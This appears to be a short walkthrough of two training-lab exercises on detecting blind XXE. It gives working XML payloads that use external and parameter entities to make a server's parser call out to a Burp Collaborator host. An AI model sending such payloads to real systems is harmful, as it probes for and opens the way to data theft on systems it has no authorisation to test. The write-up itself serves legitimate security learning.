# Detecting blind XXE using out-of-band (OAST) techniques

## Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Solution:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://4pu94og180nmlpwba4ryynwgk7qzeo.burpcollaborator.net"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

## Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Solution:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://dxey5zylgsj6urlre84bcz7et5zvnk.burpcollaborator.net"> %xxe; ]>
```